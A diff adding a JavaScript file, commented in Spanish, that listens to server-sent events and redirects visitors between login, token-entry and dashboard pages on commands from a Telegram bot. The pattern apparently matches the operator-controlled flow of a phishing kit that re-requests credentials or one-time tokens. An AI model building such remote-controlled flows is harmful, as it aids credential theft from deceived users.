@@ -1,0 +1,106 @@
+// Función para manejar acciones del bot de Telegram
+function handleTelegramAction(action, messageId) {
+    console.log('Recibida acción:', action, 'para mensaje:', messageId);
+    
+    switch(action) {
+        case 'error_logo':
+            console.log('Redirigiendo a index.html con error de logo');
+            window.location.href = 'index.html';
+            sessionStorage.setItem('showError', 'true');
+            break;
+            
+        case 'pedir_logo':
+            console.log('Redirigiendo a index.html para nuevo logo');
+            window.location.href = 'index.html';
+            sessionStorage.removeItem('showError');
+            break;
+            
+        case 'error_token':
+            console.log('Redirigiendo a token.html con error');
+            window.location.href = 'token.html';
+            sessionStorage.setItem('tokenError', 'true');
+            break;
+            
+        case 'pedir_token':
+            console.log('Redirigiendo a token.html para nuevo token');
+            window.location.href = 'token.html';
+            sessionStorage.removeItem('tokenError');
+            break;
+            
+        case 'finalizar':
+            console.log('Redirigiendo a dashboard.html');
+            window.location.href = 'dashboard.html';
+            break;
+            
+        default:
+            console.warn('Acción desconocida:', action);
+    }
+}
+
+// Función para inicializar EventSource
+function initializeEventSource() {
+    console.log('Inicializando EventSource...');
+    
+    // Cerrar conexión anterior si existe
+    if (window.evtSource) {
+        window.evtSource.close();
+    }
+
+    // Crear nueva conexión
+    const evtSource = new EventSource('/api/events');
+    window.evtSource = evtSource;
+
+    // Manejar eventos recibidos
+    evtSource.onmessage = (event) => {
+        try {
+            const data = JSON.parse(event.data);
+            console.log('Datos SSE recibidos:', data);
+            
+            if (data.type === 'action' && data.action) {
+                handleTelegramAction(data.action, data.messageId);
+            }
+        } catch (error) {
+            console.error('Error procesando mensaje SSE:', error);
+        }
+    };
+
+    // Manejar conexión establecida
+    evtSource.onopen = () => {
+        console.log('Conexión SSE establecida');
+    };
+
+    // Manejar errores y reconexión
+    evtSource.onerror = (error) => {
+        console.error('Error en EventSource:', error);
+        
+        // Cerrar conexión actual
+        evtSource.close();
+        
+        // Intentar reconectar después de 5 segundos
+        setTimeout(() => {
+            console.log('Intentando reconexión...');
+            initializeEventSource();
+        }, 5000);
+    };
+
+    // Agregar manejador para cuando la página se cierre
+    window.addEventListener('beforeunload', () => {
+        if (evtSource) {
+            evtSource.close();
+        }
+    });
+
+    return evtSource;
+}
+
+// Inicializar cuando el DOM esté listo
+document.addEventListener('DOMContentLoaded', () => {
+    console.log('DOM cargado, inicializando eventos de Telegram...');
+    initializeEventSource();
+});
+
+// Exportar funciones para uso en otros archivos
+window.telegramEvents = {
+    initialize: initializeEventSource,
+    handleAction: handleTelegramAction
+};
